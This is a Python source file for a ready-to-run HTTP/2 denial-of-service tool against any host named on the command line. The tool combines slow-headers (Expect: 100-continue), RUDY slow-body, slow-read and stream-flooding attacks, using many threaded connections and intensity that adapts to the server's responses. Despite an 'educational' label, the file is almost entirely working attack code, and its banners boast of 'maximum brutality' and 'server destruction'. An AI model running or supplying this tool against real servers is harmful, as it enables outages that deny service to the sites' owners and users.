#!/usr/bin/env python3
"""
HTTP/2 Aggressive Low and Slow Attack Script - Educational/Research Tool
Uses h2 library for reliable HTTP/2 implementation with aggressive attack patterns.

Attack Categories:
1. Slow Headers (Slowloris over HTTP/2) - Incomplete headers via CONTINUATION abuse
2. Slow Body (RUDY) - Massive Content-Length with minimal data trickling  
3. Slow Read - Aggressive flow control window manipulation
4. Stream Flooding - Maximum concurrent streams with persistence

Target: Apache HTTP/2 server
Purpose: Educational demonstration of HTTP/2 vulnerabilities
"""

import socket
import threading
import time
import random
import sys
import argparse
import h2.connection
import h2.events
import h2.config

# Global stop event for coordinated shutdown
stop_event = threading.Event()

class AggressiveSlowStream:
    """Represents a single aggressive slow HTTP/2 stream using h2 library"""
    
    def __init__(self, stream_id: int, attack_type: str):
        self.stream_id = stream_id
        self.attack_type = attack_type
        self.created_time = time.time()
        self.last_activity = time.time()
        self.state = "init"
        self.data_sent = 0
        
        # Aggressive low and slow parameters
        self.target_size = random.randint(10000000, 100000000)  # 10MB - 100MB  
        self.headers_sent = False
        self.continuation_count = 0
        self.bytes_per_interval = random.randint(1, 3)  # Very slow data transmission
        
        if attack_type == "slow_headers":
            self._prepare_massive_headers()
        elif attack_type == "slow_body":
            self._prepare_slow_body()
        elif attack_type == "slow_read":
            self._prepare_slow_read()
    
    def _prepare_massive_headers(self):
        """Prepare headers for slow transmission to existing endpoint"""
        self.base_headers = [
            (':method', 'GET'),
            (':path', '/'),
            (':authority', 'localhost'),
            (':scheme', 'http'),
            ('user-agent', 'Mozilla/5.0 (compatible; SlowBot/1.0)'),
            ('accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),
            ('accept-encoding', 'gzip, deflate'),
            ('accept-language', 'en-US,en;q=0.9'),
            ('cache-control', 'no-cache'),
            ('connection', 'keep-alive'),
        ]
        
        # Add many custom headers for slow transmission
        self.custom_headers = []
        for i in range(100):
            name = f'x-slow-header-{i:04d}'
            # Each header value is smaller but still meaningful
            value = f'slow-value-{i:04d}-' + 'X' * 500
            self.custom_headers.append((name, value))
        
        self.pending_headers = self.custom_headers.copy()
        self.state = "headers_ready"
    
    def _prepare_slow_body(self):
        """Prepare for RUDY attack with large Content-Length"""
        self.headers = [
            (':method', 'POST'),
            (':path', '/'),
            (':authority', 'localhost'),
            (':scheme', 'http'),
            ('content-type', 'text/plain'),
            ('content-length', str(self.target_size)),
            ('expect', '100-continue'),
        ]
        self.state = "headers_ready"
    
    def _prepare_slow_read(self):
        """Prepare for slow read attack"""
        self.headers = [
            (':method', 'GET'),
            (':path', '/'),
            (':authority', 'localhost'),
            (':scheme', 'http'),
            ('accept', '*/*'),
        ]
        self.initial_window = 16  # Very small window
        self.state = "headers_ready"
    
    

class AggressiveHTTP2Worker(threading.Thread):
    """Manages a single HTTP/2 connection with maximum aggression"""
    
    def __init__(self, target_host: str, target_port: int, connection_id: int,
                 streams_per_connection: int, attack_types: list):
        super().__init__(daemon=True)
        self.target_host = target_host
        self.target_port = target_port
        self.connection_id = connection_id
        self.streams_per_connection = streams_per_connection
        self.attack_types = attack_types
        self.socket = None
        self.conn = None
        self.streams = {}
        self.next_stream_id = 1
        self.connection_established = False
        
        # Adaptive timing metrics
        self.server_response_times = []
        self.successful_streams = 0
        self.failed_streams = 0
        self.server_resets = 0
        self.adaptation_factor = 1.0  # Multiplier for timing adjustments
        
    def run(self):
        """Main worker execution with aggressive attack patterns"""
        try:
            self._establish_http2_connection()
            if self.connection_established:
                self._launch_aggressive_streams()
                self._maintain_relentless_attack()
        except Exception as e:
            print(f"[!] Connection {self.connection_id} failed: {e}")
        finally:
            self._cleanup()
    
    def _establish_http2_connection(self):
        """Establish HTTP/2 connection using h2 library"""
        retry_count = 0
        max_retries = 3
        
        while not stop_event.is_set() and retry_count < max_retries:
            try:
                # Clean up previous attempt
                if self.socket:
                    try:
                        self.socket.close()
                    except:
                        pass
                    self.socket = None
                
                # Create TCP socket with appropriate timeout
                self.socket = socket.create_connection((self.target_host, self.target_port), timeout=30)
                self.socket.settimeout(10.0)
                
                # Create HTTP/2 connection with conservative settings
                config = h2.config.H2Configuration(
                    client_side=True,
                    header_encoding='utf-8'
                )
                self.conn = h2.connection.H2Connection(config=config)
                self.conn.initiate_connection()
                
                # Send connection preface and settings
                data_to_send = self.conn.data_to_send()
                if data_to_send:
                    self.socket.sendall(data_to_send)
                
                # Wait for server settings and acknowledgment
                response_received = False
                for _ in range(3):  # Try multiple times to get response
                    try:
                        data = self.socket.recv(8192)
                        if data:
                            events = self.conn.receive_data(data)
                            self._handle_connection_events(events)
                            response_received = True
                            break
                    except socket.timeout:
                        continue
                
                if not response_received:
                    raise Exception("No response from server during handshake")
                
                self.connection_established = True
                print(f"[+] Connection {self.connection_id} established successfully")
                return
                
            except Exception as e:
                retry_count += 1
                print(f"[!] Connection {self.connection_id} attempt {retry_count} failed: {e}")
                if self.socket:
                    try:
                        self.socket.close()
                    except:
                        pass
                    self.socket = None
                
                if retry_count < max_retries:
                    time.sleep(retry_count * 1)  # Shorter backoff
                    
        print(f"[!] Connection {self.connection_id} failed after {max_retries} attempts")
    
    def _handle_connection_events(self, events):
        """Handle HTTP/2 connection events"""
        for event in events:
            if isinstance(event, h2.events.SettingsAcknowledged):
                print(f"[+] Connection {self.connection_id}: Settings acknowledged")
            elif isinstance(event, h2.events.RemoteSettingsChanged):
                print(f"[+] Connection {self.connection_id}: Server settings received")
    
    def _launch_aggressive_streams(self):
        """Launch maximum number of streams immediately"""
        print(f"[+] Connection {self.connection_id}: Launching {self.streams_per_connection} aggressive streams")
        
        for i in range(self.streams_per_connection):
            if stop_event.is_set():
                break
                
            stream_id = self._get_next_stream_id()
            # Strategic attack type selection for better low and slow effect
            attack_type = self._select_strategic_attack_type()
            
            stream = AggressiveSlowStream(stream_id, attack_type)
            self.streams[stream_id] = stream
            
            self._initiate_stream_attack(stream)
            
            # Moderate stream creation for reliability and low and slow effect
            time.sleep(random.uniform(0.2, 0.8))
    
    def _get_next_stream_id(self) -> int:
        """Get next valid client stream ID"""
        stream_id = self.next_stream_id
        self.next_stream_id += 2  # Client streams are odd
        if self.next_stream_id > 1000000:  # Very high limit
            self.next_stream_id = 1
        return stream_id
    
    def _select_strategic_attack_type(self) -> str:
        """Strategically select attack type for optimal low and slow effect"""
        # Count current attack types to balance them
        type_counts = {}
        for stream in self.streams.values():
            attack_type = stream.attack_type
            type_counts[attack_type] = type_counts.get(attack_type, 0) + 1
        
        # Preferred distribution for low and slow:
        # 50% slow_headers (most effective for keeping connections open)
        # 30% slow_body (good for resource consumption)
        # 20% slow_read (forces server buffering)
        total_streams = len(self.streams)
        
        if total_streams == 0:
            # First stream - start with slow_headers
            return "slow_headers"
        
        # Calculate current ratios
        slow_headers_ratio = type_counts.get("slow_headers", 0) / total_streams
        slow_body_ratio = type_counts.get("slow_body", 0) / total_streams
        slow_read_ratio = type_counts.get("slow_read", 0) / total_streams
        
        # Choose based on what we need more of
        if slow_headers_ratio < 0.5 and "slow_headers" in self.attack_types:
            return "slow_headers"
        elif slow_body_ratio < 0.3 and "slow_body" in self.attack_types:
            return "slow_body"
        elif slow_read_ratio < 0.2 and "slow_read" in self.attack_types:
            return "slow_read"
        else:
            # Fall back to weighted random
            weights = {"slow_headers": 5, "slow_body": 3, "slow_read": 2}
            available_types = [t for t in self.attack_types if t in weights]
            if not available_types:
                return random.choice(self.attack_types)
            
            weighted_choices = []
            for attack_type in available_types:
                weighted_choices.extend([attack_type] * weights[attack_type])
            
            return random.choice(weighted_choices)
    
    def _initiate_stream_attack(self, stream: AggressiveSlowStream):
        """Initiate specific attack type for stream"""
        try:
            # Check connection state before attempting to send headers
            if not self.connection_established or not self.socket:
                print(f"[!] Cannot start stream {stream.stream_id}: connection not established")
                return
            
            if stream.attack_type == "slow_headers":
                self._start_slow_headers_attack(stream)
            elif stream.attack_type == "slow_body":
                self._start_slow_body_attack(stream)
            elif stream.attack_type == "slow_read":
                self._start_slow_read_attack(stream)
                
            # Send any queued data
            data_to_send = self.conn.data_to_send()
            if data_to_send and self.socket:
                try:
                    self.socket.sendall(data_to_send)
                except Exception as send_error:
                    print(f"[!] Failed to send data for stream {stream.stream_id}: {send_error}")
                    self.connection_established = False
                
        except Exception as e:
            print(f"[!] Failed to initiate stream {stream.stream_id}: {e}")
            # Mark connection as potentially problematic
            self.connection_established = False
    
    def _start_slow_headers_attack(self, stream: AggressiveSlowStream):
        """Start slow headers attack with Expect: 100-continue"""
        try:
            # Use Expect: 100-continue to force server to wait for body
            # Server must send 100 Continue before we send body, but we never will
            incomplete_headers = [
                (':method', 'POST'),
                (':path', '/'),
                (':authority', 'localhost'),
                (':scheme', 'http'),
                ('content-type', 'application/x-www-form-urlencoded'),
                ('content-length', str(stream.target_size)),  # Large body expected
                ('expect', '100-continue'),  # Force server to wait for body
            ]
            
            self.conn.send_headers(
                stream.stream_id, 
                incomplete_headers,
                end_stream=False  # Important: not ending stream
            )
            stream.headers_sent = True
            stream.state = "waiting_for_continue"
            stream.last_activity = time.time()
            
            print(f"[+] Stream {stream.stream_id}: Started slow headers with 100-continue, waiting for server")
            
        except Exception as e:
            print(f"[!] Failed to start slow headers for stream {stream.stream_id}: {e}")
    
    def _start_slow_body_attack(self, stream: AggressiveSlowStream):
        """Start RUDY attack with chunked encoding and large Content-Length"""
        try:
            # Use both Content-Length and Transfer-Encoding to confuse server
            rudy_headers = [
                (':method', 'POST'),
                (':path', '/'),
                (':authority', 'localhost'),
                (':scheme', 'http'),
                ('content-type', 'application/x-www-form-urlencoded'),
                ('content-length', str(stream.target_size)),  # Large size
                ('transfer-encoding', 'chunked'),  # Chunked encoding
            ]
            
            self.conn.send_headers(
                stream.stream_id,
                rudy_headers,
                end_stream=False
            )
            stream.headers_sent = True
            stream.state = "body_sending"
            stream.last_activity = time.time()
            
            print(f"[+] Stream {stream.stream_id}: Started RUDY attack, chunked + {stream.target_size:,} bytes")
            
        except Exception as e:
            print(f"[!] Failed to start RUDY attack for stream {stream.stream_id}: {e}")
    
    def _start_slow_read_attack(self, stream: AggressiveSlowStream):
        """Start slow read attack requesting large range"""
        try:
            # Request a large range of data but read it extremely slowly
            slow_read_headers = [
                (':method', 'GET'),
                (':path', '/'),
                (':authority', 'localhost'),
                (':scheme', 'http'),
                ('accept', '*/*'),
                ('range', f'bytes=0-{stream.target_size}'),  # Request large range
                ('accept-encoding', 'gzip, deflate'),  # Force server processing
            ]
            
            self.conn.send_headers(
                stream.stream_id,
                slow_read_headers,
                end_stream=True
            )
            
            stream.headers_sent = True
            stream.state = "reading_slowly"
            stream.last_activity = time.time()
            
            print(f"[+] Stream {stream.stream_id}: Started slow read, requesting {stream.target_size:,} bytes")
            
        except Exception as e:
            print(f"[!] Failed to start slow read for stream {stream.stream_id}: {e}")
    
    
    def _maintain_relentless_attack(self):
        """Main attack maintenance loop - relentless and aggressive"""
        while not stop_event.is_set() and self.connection_established:
            try:
                current_time = time.time()
                
                # Handle any incoming data
                self.socket.settimeout(0.5)
                try:
                    data = self.socket.recv(65535)
                    if data:
                        events = self.conn.receive_data(data)
                        self._handle_stream_events(events)
                except socket.timeout:
                    pass
                except ConnectionResetError:
                    print(f"[!] Connection {self.connection_id} reset by server")
                    break
                
                # Maintain all streams aggressively
                streams_to_remove = []
                for stream_id, stream in self.streams.items():
                    try:
                        if self._maintain_aggressive_stream(stream, current_time):
                            streams_to_remove.append(stream_id)
                    except Exception as e:
                        print(f"[!] Error maintaining stream {stream_id}: {e}")
                        streams_to_remove.append(stream_id)
                
                # Remove dead streams
                for stream_id in streams_to_remove:
                    self.streams.pop(stream_id, None)
                
                # Immediately replace dropped streams
                while len(self.streams) < self.streams_per_connection and not stop_event.is_set():
                    stream_id = self._get_next_stream_id()
                    attack_type = self._select_strategic_attack_type()
                    
                    stream = AggressiveSlowStream(stream_id, attack_type)
                    self.streams[stream_id] = stream
                    self._initiate_stream_attack(stream)
                    
                    time.sleep(2.0)  # Slow replacement for low and slow
                
                # Send any queued data
                data_to_send = self.conn.data_to_send()
                if data_to_send:
                    self.socket.sendall(data_to_send)
                
                # Status update
                if len(self.streams) > 0:
                    avg_age = sum(current_time - s.created_time for s in self.streams.values()) / len(self.streams)
                    print(f"[*] Conn {self.connection_id}: {len(self.streams)} streams, avg age {avg_age:.1f}s")
                
                # Adaptive maintenance timing based on server behavior
                base_sleep = random.uniform(2, 5)
                adaptive_sleep = base_sleep / self.adaptation_factor
                time.sleep(adaptive_sleep)
                
            except Exception as e:
                print(f"[!] Maintenance error for connection {self.connection_id}: {e}")
                break
    
    def _handle_stream_events(self, events):
        """Handle HTTP/2 stream events with adaptive monitoring"""
        for event in events:
            current_time = time.time()
            
            if isinstance(event, h2.events.StreamEnded):
                # Server ended a stream - indicates server is responding
                stream = self.streams.get(event.stream_id)
                if stream:
                    response_time = current_time - stream.created_time
                    self.server_response_times.append(response_time)
                    self.failed_streams += 1
                print(f"[!] CRITICAL: Stream {event.stream_id} ended by server!")
                
            elif isinstance(event, h2.events.ResponseReceived):
                # Server responded - this is bad for low and slow attack
                stream = self.streams.get(event.stream_id)
                if stream:
                    response_time = current_time - stream.created_time
                    self.server_response_times.append(response_time)
                    self.successful_streams += 1
                print(f"[!] CRITICAL: Stream {event.stream_id} got response - server processed request!")
                
            elif isinstance(event, h2.events.DataReceived):
                print(f"[+] Stream {event.stream_id} received {len(event.data)} bytes")
                
            elif isinstance(event, h2.events.StreamReset):
                # Stream reset could indicate overload (good) or rejection (bad)
                self.server_resets += 1
                print(f"[+] Stream {event.stream_id} reset by server (good - means overload)")
                
            elif isinstance(event, h2.events.ConnectionTerminated):
                print(f"[!] Connection {self.connection_id} terminated by server")
                self.connection_established = False
                break
                
        # Update adaptation factor based on server behavior
        self._update_adaptation_factor()
    
    def _update_adaptation_factor(self):
        """Update timing adaptation based on server behavior"""
        total_streams = self.successful_streams + self.failed_streams
        
        if total_streams < 5:  # Need some data before adapting
            return
            
        # Calculate success rate (lower is better for low and slow)
        success_rate = self.successful_streams / total_streams
        
        # Calculate average response time
        avg_response_time = 0
        if self.server_response_times:
            avg_response_time = sum(self.server_response_times[-10:]) / len(self.server_response_times[-10:])
        
        # Adapt based on server behavior
        if success_rate > 0.7:  # Too many successful responses
            # Server is handling our requests too well - increase intensity
            self.adaptation_factor = min(2.0, self.adaptation_factor * 1.1)
            print(f"[*] Conn {self.connection_id}: Server handling requests well, increasing intensity (factor: {self.adaptation_factor:.2f})")
        elif success_rate < 0.3 and self.server_resets > total_streams * 0.5:
            # Good - server is overwhelmed, maintain current pace
            self.adaptation_factor = max(0.5, self.adaptation_factor * 0.95)
            print(f"[*] Conn {self.connection_id}: Server showing stress, maintaining pace (factor: {self.adaptation_factor:.2f})")
        elif avg_response_time < 0.1:  # Very fast responses
            # Server is too responsive - increase intensity
            self.adaptation_factor = min(2.0, self.adaptation_factor * 1.05)
            print(f"[*] Conn {self.connection_id}: Fast responses, increasing intensity (factor: {self.adaptation_factor:.2f})")
    
    def _maintain_aggressive_stream(self, stream: AggressiveSlowStream, current_time: float) -> bool:
        """Maintain individual stream aggressively"""
        stream_age = current_time - stream.created_time
        time_since_activity = current_time - stream.last_activity
        
        # Keep streams alive much longer
        if stream_age > 3600:  # 1 hour maximum
            return True
        
        # Adaptive timing based on server behavior
        base_interval = random.uniform(5, 15)
        adapted_interval = base_interval / self.adaptation_factor
        
        if time_since_activity < adapted_interval:
            return False
        
        # Perform attack-specific maintenance
        try:
            if stream.attack_type == "slow_headers" and (stream.state == "headers_partial" or stream.state == "waiting_for_continue"):
                return self._continue_slow_headers(stream)
            elif stream.attack_type == "slow_body" and stream.state == "body_sending":
                return self._continue_slow_body(stream)
            elif stream.attack_type == "slow_read" and stream.state == "reading_slowly":
                return self._continue_slow_read(stream)
                
        except Exception as e:
            print(f"[!] Error in stream maintenance: {e}")
            return True
        
        return False
    
    def _continue_slow_headers(self, stream: AggressiveSlowStream) -> bool:
        """Continue slow headers attack by never sending the expected body"""
        try:
            if stream.state == "waiting_for_continue":
                # Server is waiting for us to send body after 100-continue
                # We never send it, keeping the server in a waiting state
                if random.random() < 0.02:  # Extremely rarely send tiny data
                    # Send minimal data but never complete the expected body size
                    tiny_data = b'a'  # Just 1 byte when server expects MB
                    self.conn.send_data(
                        stream.stream_id,
                        tiny_data,
                        end_stream=False  # Never end!
                    )
                    stream.data_sent += 1
                    progress = (stream.data_sent / stream.target_size) * 100
                    print(f"[+] Stream {stream.stream_id}: Sent 1B of {stream.target_size:,}B expected ({progress:.10f}%)")
                
                stream.last_activity = time.time()
                
            else:
                # Just keep the stream alive
                stream.last_activity = time.time()
                
        except Exception as e:
            print(f"[!] Failed to maintain slow headers: {e}")
            return True
        
        return False  # Never remove slow header streams
    
    def _continue_slow_body(self, stream: AggressiveSlowStream) -> bool:
        """Continue RUDY attack with incomplete chunked data"""
        try:
            # Send extremely small chunks very infrequently
            # Simulate incomplete chunked encoding
            if random.random() < 0.1:  # Only 10% chance to send data each time
                chunk_size = stream.bytes_per_interval
                
                # Create malformed chunk data that never completes properly
                chunk_data = b'a' * chunk_size
                
                # Sometimes send partial chunk headers without completing them
                if random.random() < 0.5:
                    # Send incomplete chunk - just the data without proper chunked format
                    self.conn.send_data(
                        stream.stream_id,
                        chunk_data,
                        end_stream=False  # Never end!
                    )
                else:
                    # Send empty data to keep stream alive
                    self.conn.send_data(
                        stream.stream_id,
                        b'',
                        end_stream=False
                    )
                
                stream.data_sent += chunk_size
                stream.last_activity = time.time()
                
                progress = (stream.data_sent / stream.target_size) * 100
                print(f"[+] Stream {stream.stream_id}: Incomplete chunk {chunk_size}B, {progress:.8f}% of {stream.target_size:,}B")
            else:
                # Just keep the stream alive without sending data
                stream.last_activity = time.time()
                
        except Exception as e:
            print(f"[!] Failed to send body data: {e}")
            return True
        
        return False  # Never remove RUDY streams
    
    def _continue_slow_read(self, stream: AggressiveSlowStream) -> bool:
        """Continue slow read attack by being very conservative with flow control"""
        try:
            # For slow read attacks, we primarily just keep the stream alive
            # by not sending window updates frequently, forcing the server to buffer
            # Send window updates very infrequently
            if random.random() < 0.05:  # Only 5% chance to send window update
                tiny_increment = random.randint(1, 2)  # Very small increment
                
                try:
                    # Try to send window update if the method exists
                    if hasattr(self.conn, 'update_flow_control_window'):
                        self.conn.update_flow_control_window(stream.stream_id, tiny_increment)
                    elif hasattr(self.conn, 'increment_flow_control_window'):
                        self.conn.increment_flow_control_window(stream.stream_id, tiny_increment)
                    
                    print(f"[+] Stream {stream.stream_id}: Reluctant window update +{tiny_increment}")
                except:
                    # If flow control methods don't work, just keep stream alive
                    pass
            
            stream.last_activity = time.time()
            
        except Exception as e:
            print(f"[!] Error in slow read maintenance: {e}")
            stream.last_activity = time.time()  # Keep stream alive anyway
            return False
        
        return False  # Never remove slow read streams
    
    def _cleanup(self):
        """Clean up connection resources"""
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
        print(f"[!] Connection {self.connection_id} closed")

class MegaAggressiveHTTP2Attack:
    """Main attack coordinator with maximum brutality"""
    
    def __init__(self, target_host: str, target_port: int, num_connections: int,
                 streams_per_connection: int, attack_types: list):
        self.target_host = target_host
        self.target_port = target_port
        self.num_connections = num_connections
        self.streams_per_connection = streams_per_connection
        self.attack_types = attack_types
        self.workers = []
    
    def start(self):
        """Launch the mega aggressive attack"""
        total_streams = self.num_connections * self.streams_per_connection
        
        print(f"[*] 🔥 MEGA AGGRESSIVE HTTP/2 LOW AND SLOW ATTACK 🔥")
        print(f"[*] Target: {self.target_host}:{self.target_port}")
        print(f"[*] Connections: {self.num_connections}")
        print(f"[*] Streams per connection: {self.streams_per_connection}")
        print(f"[*] Total streams: {total_streams:,}")
        print(f"[*] Attack types: {', '.join(self.attack_types)}")
        print(f"[*] ⚠️  DESIGNED FOR INCOMPLETE REQUESTS - LOW AND SLOW RESOURCE EXHAUSTION ⚠️")
        
        try:
            # Launch all connections rapidly
            for i in range(self.num_connections):
                if stop_event.is_set():
                    break
                    
                worker = AggressiveHTTP2Worker(
                    self.target_host, self.target_port, i,
                    self.streams_per_connection, self.attack_types
                )
                
                worker.start()
                self.workers.append(worker)
                
                # Moderate delay between connections for reliability
                time.sleep(random.uniform(0.5, 1.5))
            
            print(f"[+] 🚀 Launched {len(self.workers)} mega aggressive connections")
            
            # Monitor the carnage
            self._monitor_destruction()
            
        except KeyboardInterrupt:
            print("\n[!] Attack terminated by user")
        finally:
            self._stop_attack()
    
    def _monitor_destruction(self):
        """Monitor the attack's destruction"""
        start_time = time.time()
        
        while not stop_event.is_set():
            try:
                elapsed = time.time() - start_time
                active_workers = sum(1 for w in self.workers if w.is_alive())
                
                # Calculate total active streams
                total_active_streams = 0
                for worker in self.workers:
                    if hasattr(worker, 'streams'):
                        total_active_streams += len(worker.streams)
                
                print(f"[*] 💀 DESTRUCTION TIME: {elapsed:.0f}s | Active connections: {active_workers}/{self.num_connections} | Active streams: {total_active_streams:,}")
                
                time.sleep(10)  # Frequent monitoring
                
            except KeyboardInterrupt:
                break
    
    def _stop_attack(self):
        """Stop the mega aggressive attack"""
        print("[!] 🛑 STOPPING MEGA AGGRESSIVE ATTACK...")
        stop_event.set()
        
        for worker in self.workers:
            worker.join(timeout=5)
        
        print("[*] 💀 MEGA AGGRESSIVE ATTACK TERMINATED")

def main():
    parser = argparse.ArgumentParser(description="Mega Aggressive HTTP/2 Low and Slow Attack Tool")
    parser.add_argument("target", help="Target hostname or IP")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port")
    parser.add_argument("-c", "--connections", type=int, default=50, help="Number of connections")
    parser.add_argument("-s", "--streams", type=int, default=25, help="Streams per connection")
    parser.add_argument("-t", "--types", nargs="+", 
                       choices=["slow_headers", "slow_body", "slow_read"],
                       default=["slow_headers", "slow_body", "slow_read"],
                       help="Attack types")
    
    args = parser.parse_args()
    
    print("🔥 MEGA AGGRESSIVE HTTP/2 LOW AND SLOW ATTACK TOOL 🔥")
    print("=" * 60)
    print("⚠️  WARNING: MAXIMUM BRUTALITY ATTACK DESIGNED FOR SERVER DESTRUCTION ⚠️")
    print("📚 Educational/Research purposes only - Use responsibly!")
    print("")
    
    attack = MegaAggressiveHTTP2Attack(
        args.target, args.port, args.connections, 
        args.streams, args.types
    )
    
    attack.start()

if __name__ == "__main__":
    main()